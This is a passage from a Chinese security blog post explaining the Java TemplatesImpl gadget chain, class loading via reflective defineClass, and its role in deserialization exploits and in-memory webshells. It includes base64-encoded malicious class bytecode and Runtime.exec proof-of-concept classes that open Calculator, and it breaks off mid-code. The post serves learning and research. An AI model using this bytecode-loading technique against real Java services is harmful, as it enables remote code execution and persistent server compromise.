<script type="text/javascript" src="/js/crash_cheat.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TemplatesImpl利用链与内存马 | jasson个人博客</title><meta name="keywords" content="JAVA安全、反序列化、代码审计、内存马"><meta name="author" content="jasson"><meta name="copyright" content="jasson"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="TemplatesImpl利用链与内存马">
<meta property="og:type" content="article">
<meta property="og:title" content="TemplatesImpl利用链与内存马">
<meta property="og:url" content="https://j-jasson2.github.io/2023/01/31/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="jasson个人博客">
<meta property="og:description" content="TemplatesImpl利用链与内存马">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img2022.cnblogs.com/blog/2804790/202204/2804790-20220413032653997-1992249252.png">
<meta property="article:published_time" content="2023-01-31T12:45:41.000Z">
<meta property="article:modified_time" content="2023-01-31T10:08:55.319Z">
<meta property="article:author" content="jasson">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="JAVA安全">
<meta property="article:tag" content="内存马">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img2022.cnblogs.com/blog/2804790/202204/2804790-20220413032653997-1992249252.png"><link rel="shortcut icon" href="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&refer=http%3A%2F%2Finews.gtimg.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630728108&t=1576409e5f212dd7279b9a1c880c7086"><link rel="canonical" href="https://j-jasson2.github.io/2023/01/31/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'TemplatesImpl利用链与内存马',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-01-31 18:08:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">79</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img2022.cnblogs.com/blog/2804790/202204/2804790-20220413032653997-1992249252.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">jasson个人博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">TemplatesImpl利用链与内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-31T12:45:41.000Z" title="发表于 2023-01-31 20:45:41">2023-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-31T10:08:55.319Z" title="更新于 2023-01-31 18:08:55">2023-01-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TemplatesImpl利用链与内存马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><meta name="referrer" content="no-referrer"/>

<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>TemplatesImpl利用链是一个非常重要的东西，要知道，CC链可以用它，CB链也用它，注入内存马还是用它。为什么？因为它可以加载java字节码并实例化。相对于调用Runtime.exec进行命令执行，加载恶意代码更贴合我们的使用。<br>《java安全漫谈》中给出了TemplatesImpl利用链：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl<span class="comment">#newTransformer() -&gt;</span></span><br><span class="line">        TemplatesImpl<span class="comment">#getTransletInstance() -&gt;</span></span><br><span class="line">            TemplatesImpl<span class="comment">#defineTransletClasses()-&gt;</span></span><br><span class="line">                TransletClassLoader<span class="comment">#defineClass()-&gt;</span></span><br></pre></td></tr></table></figure>
<p>在CB1分析中有提到，其实这条利用链还能加一个getOutputProperties，详见：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12042">https://xz.aliyun.com/t/12042</a></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl<span class="comment">#getOutputProperties() -&gt; </span></span><br><span class="line">TemplatesImpl<span class="comment">#newTransformer() -&gt; </span></span><br><span class="line">TemplatesImpl<span class="comment">#getTransletInstance() -&gt; </span></span><br><span class="line">TemplatesImpl<span class="comment">#defineTransletClasses() -&gt; </span></span><br><span class="line">TransletClassLoader<span class="comment">#defineClass()</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673860816897-83c881c4-f84d-495d-8937-499717ebfdf6.png#averageHue=%2368533a&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=369&id=ue9bbdc36&margin=%5Bobject%20Object%5D&name=image.png&originHeight=738&originWidth=1548&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121239&status=done&style=none&taskId=u445cdeda-47bb-446d-b6b3-3e47ad1214d&title=&width=774" alt="image.png"></p>
<h2 id="0x02-类加载器"><a href="#0x02-类加载器" class="headerlink" title="0x02 类加载器"></a>0x02 类加载器</h2><p>ClassLoader，类加载器，是JVM执行类加载机制的前提，其主要任务为根据一个类的全限定名来读取此类的二进制字节流到JVM内部，然后转换为一个与目标类对应的java.lang.Class对象实例。<br>ClassLoader提供的API</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang;</span><br><span class="line">public abstract class ClassLoader &#123;</span><br><span class="line">	public Class loadClass(String name);</span><br><span class="line"> 	protected Class defineClass(byte[] b);</span><br><span class="line">	public URL getResource(String name);</span><br><span class="line">	public Enumeration getResources(String name);</span><br><span class="line">	public ClassLoader getParent();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URLClassLoader</span><br><span class="line">DefineClassLoader</span><br><span class="line">BCELClassloader</span><br><span class="line">TemplatesImpl</span><br></pre></td></tr></table></figure>
<h2 id="0x03-defineClass加载器"><a href="#0x03-defineClass加载器" class="headerlink" title="0x03 defineClass加载器"></a>0x03 defineClass加载器</h2><p>通过反射获取ClassLoader#defineClass，进而读取字节码加载类</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.classloader;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class DefineClassLoaderDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="regexp">//</span>反射获取ClassLoader<span class="comment">#defineClass</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.ClassLoader&quot;</span>);</span><br><span class="line">        Method defineClassMethod = clazz.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, byte[].class, int.class, int.class);</span><br><span class="line">        defineClassMethod.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        <span class="regexp">//</span>先编译Evil.java，再进行base64编码</span><br><span class="line">        //cat Evil.class | base64</span><br><span class="line">        byte[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAMAoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAIACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFkxjb20vY2xhc3Nsb2FkZXIvRXZpbDsBAApFeGNlcHRpb25zBwAkAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAALAAwHACUMACYAJwEAAnt9BwAoDAApACoHACsMACwALQEAKG9wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAMAC4ALwEABnN0YXRpYwEAFGNvbS9jbGFzc2xvYWRlci9FdmlsAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAIADQAAAEwAAgABAAAAFiq3AAGyAAISA7YABLgABRIGtgAHV7EAAAACAA4AAAASAAQAAAAGAAQADQAMAAcAFQAIAA8AAAAMAAEAAAAWABAAEQAAABIAAAAEAAEAEwAIABQADAABAA0AAAAlAAIAAAAAAAmyAAISCLYABLEAAAABAA4AAAAKAAIAAAAKAAgACwABABUAAAACABY=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class targetClass = (Class) defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;com.classloader.Evil&quot;</span>,bytes,<span class="number">0</span>,bytes.length);</span><br><span class="line">        targetClass.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看最后两行，通过反射拿到的方法，创建class对象。<br>通过newInstance实例化对象，触发恶意代码</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class targetClass = (Class) defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;com.classloader.Evil&quot;</span>,bytes,<span class="number">0</span>,bytes.length);</span><br><span class="line">targetClass.newInstance();</span><br></pre></td></tr></table></figure>
<p>com.classloader.Evil代码如下</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.classloader;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil &#123;</span><br><span class="line">    public Evil() throws IOException&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    static &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="0x04-newInstance与new"><a href="#0x04-newInstance与new" class="headerlink" title="0x04 newInstance与new"></a>0x04 newInstance与new</h2><p>我们知道，一个对象在可以被使用之前必须要被正确地实例化。<br>常见的实例化方式为</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reTest re = new reTest();</span><br></pre></td></tr></table></figure>
<p>如图，有个类reTest，分别存在static{}代码块，{}代码块，无参构造方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673861649489-34d377db-023c-498d-a81c-47c02a4e1cd3.png#averageHue=%232b2b2b&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=303&id=u1aa2ec1a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=606&originWidth=1310&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54999&status=done&style=none&taskId=ue468ec33-ed4e-4320-995f-ea22e5b6cba&title=&width=655" alt="image.png"><br>实例化该类，可以看到，上面的3个代码块都执行了，并且顺序为: static{}&gt;{}&gt;无参构造方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673861552644-f88ad325-4258-4ece-96fb-beb23c05d952.png#averageHue=%232c2c2b&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=607&id=u418aee4a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1214&originWidth=1876&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118952&status=done&style=none&taskId=u06d2174a-44b8-4220-9a7a-6738742d769&title=&width=938" alt="image.png"><br>再看通过newInstance的方式，一样执行了几个代码块中的内容。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673861831140-087f6ae7-8b3a-4920-b3db-d2773efb1532.png#averageHue=%232c2d2b&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=576&id=uea3ced04&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1152&originWidth=1856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=281693&status=done&style=none&taskId=ubd3390be-c316-4acc-a238-78c596bec71&title=&width=928" alt="image.png"><br>所以我们可以知道：<br><strong>defineClass方法直接根据字节数组定义一个类，如果没有执行newInstance，那么不会执行静态代码块、构造代码块、构造方法中的内容。</strong></p>
<h2 id="0x05-利用TemplatesImpl来加载字节码"><a href="#0x05-利用TemplatesImpl来加载字节码" class="headerlink" title="0x05 利用TemplatesImpl来加载字节码"></a>0x05 利用TemplatesImpl来加载字节码</h2><p>1、首先准备一个命令执行Exp。看了前面的内容知道，这里是写了一个无参构造方法，内容为调用Runtime执行一个弹出计算器的命令。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.classloader;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class TemplatesImplEvil extends AbstractTranslet &#123;</span><br><span class="line">    public TemplatesImplEvil() throws IOException &#123;</span><br><span class="line">        super();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2、然后我们就会有疑惑了，为什么这个Exp代码这么长，多了一些什么东西？</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、继承了一个类AbstractTranslet</span><br><span class="line"><span class="number">2</span>、多了两个transform方法</span><br></pre></td></tr></table></figure>
<p>3、编写代码，加载前面的TemplatesImplEvil字节码</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.classloader;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplatesImplDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        <span class="regexp">//</span>cat TemplatesImplEvil.class | base64</span><br><span class="line">        byte[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAjTGNvbS9jbGFzc2xvYWRlci9UZW1wbGF0ZXNJbXBsRXZpbDsBAApFeGNlcHRpb25zBwAlAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcAJgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRlbXBsYXRlc0ltcGxFdmlsLmphdmEMAAcACAcAJwwAKAApAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAKgArAQAhY29tL2NsYXNzbG9hZGVyL1RlbXBsYXRlc0ltcGxFdmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADgAEAA8ADQAQAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAFgALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAA4AAAAEAAEAFgABABAAFwACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAGgALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABgAGQACAAAAAQAaABsAAwAOAAAABAABABYAAQAcAAAAAgAd&quot;</span>);</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, <span 